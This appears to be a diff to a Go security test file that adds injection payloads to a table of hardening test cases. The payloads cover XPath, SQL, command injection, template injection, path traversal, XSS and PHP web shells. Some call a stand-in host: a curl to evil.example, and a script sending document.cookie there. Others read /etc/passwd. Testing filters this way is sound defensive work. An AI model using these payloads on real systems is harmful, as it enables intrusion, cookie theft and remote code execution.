@@ -35,10 +35,31 @@ func hardeningCases() []testCase {
 			"' or (:(:nested:)comment:) true() or 'a'='b",
 			"' or (count(//account)>0) or 'a'='b",
 			"' and (string-length(name())>0) and 'a'='a",
+			"' or local-name(/*)='users' or 'a'='b",
+			"']|//password|//*['a'='a",
 		}},
-		{"rce", []string{";${IFS}id", ";i${UNSET_VAR}d", ";/bin/i\"\"d", "$( /usr/bin/id )", "`who'am'i`"}},
-		{"ssti", []string{"{{ (7 * 7) }}", "${(7*7)}", "*{(8 + 8)}", "{{ config.items() }}"}},
-		{"lfi", []string{"%25252e%25252e%25252fetc%25252fpasswd", "%2525252e%2525252e%2525252fetc%2525252fpasswd"}},
+		{"rce", []string{";${IFS}id", ";i${UNSET_VAR}d", ";/bin/i\"\"d", "$( /usr/bin/id )", "`who'am'i`",
+			";cat$IFS/etc/passwd", "|/bin/cat /etc/passwd", "$(curl${IFS}evil.example)"}},
+		{"ssti", []string{"{{ (7 * 7) }}", "${(7*7)}", "*{(8 + 8)}", "{{ config.items() }}",
+			"{{''.__class__.__mro__}}", "{{request.application.__globals__}}"}},
+		{"lfi", []string{"%25252e%25252e%25252fetc%25252fpasswd", "%2525252e%2525252e%2525252fetc%2525252fpasswd",
+			"..%c0%af..%c0%afetc%c0%afpasswd", "php://filter/convert.base64-encode/resource=/etc/passwd",
+			"....//....//....//etc/passwd", "/var/www/html/../../../../etc/passwd"}},
+		{"sqli", []string{
+			"1') OR ('1'='1'-- -", "1 UNION SELECT username,password FROM users-- -", "admin' OR '1'='1'-- -",
+			"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+			"1 OR SLEEP(5)-- -", "1;SELECT pg_sleep(5)-- -", "1 /*!50000UNION*/ /*!50000SELECT*/ NULL-- -",
+		}},
+		{"xss", []string{
+			"<script>document.location=`//evil.example/`+document.cookie</script>", "<img src=x onerror=prompt(document.domain)>",
+			"\"><svg/onload=alert(document.domain)>", "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
+			"<details open ontoggle=confirm(1)>",
+		}},
+		{"php", []string{
+			"<?php echo shell_exec($_GET['c']); ?>", "<?= passthru('id') ?>",
+			"<?php system(base64_decode('aWQ=')); ?>", "<?php eval($_POST['x']); ?>",
+			"<?php file_get_contents('/etc/passwd'); ?>",
+		}},
 	} {
 		for i, value := range family.payloads {
 			path := "/api/loadtest/" + family.category
